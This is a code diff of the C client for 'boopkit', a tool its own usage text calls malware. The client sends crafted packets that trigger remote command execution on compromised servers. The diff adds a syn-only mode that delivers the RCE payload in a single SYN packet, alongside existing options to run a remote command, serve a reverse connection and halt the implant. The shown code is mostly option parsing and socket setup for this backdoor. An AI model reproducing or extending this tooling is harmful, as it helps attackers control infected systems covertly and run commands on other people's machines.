@@ -47,18 +47,20 @@ void usage() {
   boopprintf("-lport             Local  (src) port      : 3535\n");
   boopprintf("-rhost             Remote (dst) address   : 127.0.0.1.\n");
   boopprintf("-rport             Remote (dst) port      : 22\n");
-  boopprintf(
-      "-9, halt/kill      Halt or kill the boopkit malware on a server.\n");
-  boopprintf("-q, quiet          Disable output.\n");
-  boopprintf("-c, execute        Remote command to exec : ls -la\n");
-  boopprintf("-r, reverse-conn   Serve the RCE on lhost:lport after a boop.\n");
+  boopprintf("-9, halt/kill      Kill the boopkit malware on a server.\n");
+  boopprintf("-c, command        Remote command to exec : ls -la\n");
   boopprintf("-h, help           Print help and usage.\n");
+  boopprintf("-q, quiet          Disable output.\n");
+  boopprintf("-r, reverse-conn   Serve the RCE on lhost:lport after a boop.\n");
+  boopprintf("-x, syn-only       Send a single SYN packet with RCE payload.\n");
   boopprintf("\n");
   exit(0);
 }
 
-// config is the configuration options for the program
-struct config {
+/**
+ * config is the CLI options that are used throughout boopkit
+ */
+ struct config {
   // metasploit inspired flags
   char rhost[INET_ADDRSTRLEN];
   char rport[MAX_ARG_LEN];
@@ -67,11 +69,16 @@ struct config {
   char rce[MAX_RCE_SIZE];
   int halt;
   int reverseconn;
+  int synonly;
 } cfg;
 
-// clisetup will initialize the config struct for the program
+/**
+ * clisetup is used to initalize the program from the command line
+ * 
+ * @param argc 
+ * @param argv 
+ */
 void clisetup(int argc, char **argv) {
-  // Default values
   strncpy(cfg.lhost, "127.0.0.1", INET_ADDRSTRLEN);
   sprintf(cfg.lport, "%d", PORT);
   strncpy(cfg.rhost, "127.0.0.1", INET_ADDRSTRLEN);
@@ -79,6 +86,7 @@ void clisetup(int argc, char **argv) {
   strncpy(cfg.rce, "ls -la", MAX_RCE_SIZE);
   cfg.halt = 0;
   cfg.reverseconn = 0;
+  cfg.synonly = 0;
   for (int i = 0; i < argc; i++) {
     if (strncmp(argv[i], "-lport", 32) == 0 && argc >= i + 1) {
       strncpy(cfg.lport, argv[i + 1], MAX_ARG_LEN);
@@ -106,6 +114,9 @@ void clisetup(int argc, char **argv) {
         case 'r':
           cfg.reverseconn = 1;
           break;
+        case 'x':
+          cfg.synonly = 1;
+          break;
         case '9':
           cfg.halt = 1;
           break;
@@ -114,7 +125,15 @@ void clisetup(int argc, char **argv) {
   }
 }
 
-void rootcheck(int argc, char **argv) {
+/**
+ * uid_check is used to check the runtime construct of boopkit
+ *
+ * Ideally boopkit is ran without sudo as uid=0 (root)
+ *
+ * @param argc
+ * @param argv
+ */
+void uid_check(int argc, char **argv) {
   long luid = (long)getuid();
   if (luid != 0) {
     boopprintf("  XX Invalid UID.\n");
@@ -123,6 +142,16 @@ void rootcheck(int argc, char **argv) {
   }
 }
 
+/**
+ * serverce is a last resort attempt to serve an RCE from a
+ * boopkit-boop client.
+ *
+ * This can be opted-in by passing -r to boopkit.
+ *
+ * @param listenstr
+ * @param rce
+ * @return
+ */
 int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
   struct sockaddr_in laddr;
   int one = 1;
@@ -163,15 +192,21 @@ int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
   return 0;
 }
 
+/**
+ * main
+ *
+ * @param argc
+ * @param argv
+ * @return
+ */
 int main(int argc, char **argv) {
   int one = 1;
   const int *oneval = &one;
   clisetup(argc, argv);
   asciiheader();
-  rootcheck(argc, argv);
+  uid_check(argc, argv);
   srand(time(NULL));
 
-  // [Destination]
   // Configure daddr fields sin_port, sin_addr, sin_family
   struct sockaddr_in daddr;
   daddr.sin_family = AF_INET;
@@ -181,7 +216,6 @@ int main(int argc, char **argv) {
     return 1;
   }
 
-  // [Source]
   // Configure saddr fields, sin_port, sin_addr, sin_family
   struct sockaddr_in saddr;
   saddr.sin_family = AF_INET;
@@ -197,7 +231,6 @@ int main(int argc, char **argv) {
   inet_ntop(AF_INET, &daddr.sin_addr, daddrstr, sizeof daddrstr);
   inet_ntop(AF_INET, &saddr.sin_addr, saddrstr, sizeof saddrstr);
 
-  // Calculate RCE
   char *packet;
   char payload[MAX_RCE_SIZE];
   if (cfg.halt) {
@@ -252,6 +285,9 @@ int main(int argc, char **argv) {
   close(sock1);
   // ===========================================================================
 
+  if (cfg.synonly){
+    return 0;
+  }
 
   // ===========================================================================
   // 2. TCP SOCK_STREAM Connection
